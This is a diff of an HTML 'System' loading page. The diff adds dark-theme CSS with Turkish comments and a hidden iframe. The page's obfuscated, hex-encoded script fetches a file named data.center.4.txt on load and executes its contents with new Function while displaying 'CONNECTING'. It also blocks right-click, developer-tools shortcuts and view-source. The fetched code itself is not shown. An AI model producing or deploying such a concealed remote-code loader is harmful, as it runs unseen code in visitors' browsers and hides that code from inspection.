@@ -1,3 +1,21 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#83;&#121;&#115;&#116;&#101;&#109;</title><style>body{margin:0;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;user-select:none;overflow:hidden}#st{font-size:10px;letter-spacing:6px;opacity:.7;text-transform:uppercase}.b_r{position:absolute;bottom:15px;right:15px}.d_i{width:18px;height:18px;filter:invert(1);opacity:.2}#t_l{position:absolute;bottom:0;left:0;width:100%;height:1px;background:linear-gradient(90deg,#111 0%,transparent 100%)}</style></head><body oncontextmenu="return false"><div id="loader"><div id="st">INITIALIZING...</div></div><div class="b_r"><img src="data.svg" class="d_i"></div><div id="t_l"></div><script>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#83;&#121;&#115;&#116;&#101;&#109;</title><style>
+/* Modern Siyah Tema */
+body,html{margin:0;padding:0;background:#000;color:#fff;height:100%;font-family:monospace;user-select:none;overflow:hidden}
+#loader{display:flex;justify-content:center;align-items:center;height:100%;position:relative;z-index:1}
+#st{font-size:10px;letter-spacing:6px;opacity:.7;text-transform:uppercase}
+/* Sabit ve Mavi Yanan Logo */
+.b_r{position:absolute;bottom:15px;right:15px;z-index:999}
+.d_i{width:20px;height:20px;filter:invert(86%) sepia(21%) saturate(583%) hue-rotate(170deg) brightness(97%) contrast(92%);opacity:.4;animation:pulse-blue 3s infinite ease-in-out}
+#t_l{position:absolute;bottom:0;left:0;width:100%;height:1px;background:linear-gradient(90deg,#111 0%,transparent 100%)}
+/* Sitenin Açılacağı Alan (İlk başta gizli) */
+#main_container{position:absolute;top:0;left:0;width:100%;height:100%;border:none;z-index:2;display:none;background:#000}
+/* Açık Mavi Nefes Alma Animasyonu */
+@keyframes pulse-blue{0%,100%{opacity:.2;transform:scale(0.9)}50%{opacity:.7;transform:scale(1.1);filter:invert(86%) sepia(21%) saturate(583%) hue-rotate(170deg) brightness(97%) contrast(92%) drop-shadow(0 0 2px #5ff)}}
+</style></head><body oncontextmenu="return false">
+<div id="loader"><div id="st">INITIALIZING...</div></div>
+<div class="b_r"><img src="data.svg" class="d_i"></div>
+<div id="t_l"></div>
+<iframe id="main_container"></iframe>
+<script>
 (function(_0x1,_0x2){const _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(['\x74\x65\x78\x74','\x41\x55\x54\x48\x5f\x46\x41\x49\x4c\x45\x44','\x43\x4f\x4e\x4e\x45\x43\x54\x49\x4e\x47','\x64\x61\x74\x61\x2e\x63\x65\x6e\x74\x65\x72\x2e\x34\x2e\x74\x78\x74'],0x1a4));const _0xdecode=function(_0x1,_0x2){const _0x3=['\x74\x65\x78\x74','\x41\x55\x54\x48\x5f\x46\x41\x49\x4c\x45\x44','\x43\x4f\x4e\x4e\x45\x43\x54\x49\x4e\x47','\x64\x61\x74\x61\x2e\x63\x65\x6e\x74\x65\x72\x2e\x34\x2e\x74\x78\x74'];return _0x3[_0x1];};(async function(){const _0x4=document['getElementById']('st');try{_0x4['innerText']=_0xdecode(0x2);const _0x5=await fetch(_0xdecode(0x3));const _0x6=await _0x5[_0xdecode(0x0)]();new Function(_0x6)();}catch(_0x7){_0x4['innerText']=_0xdecode(0x1);}}());window.onkeydown=function(_0x8){if(_0x8['keyCode']==0x7b||(_0x8['ctrlKey']&&_0x8['shiftKey']&&(_0x8['keyCode']==0x49||_0x8['keyCode']==0x4a))||(_0x8['ctrlKey']&&_0x8['keyCode']==0x55))return false;};
 </script></body></html>
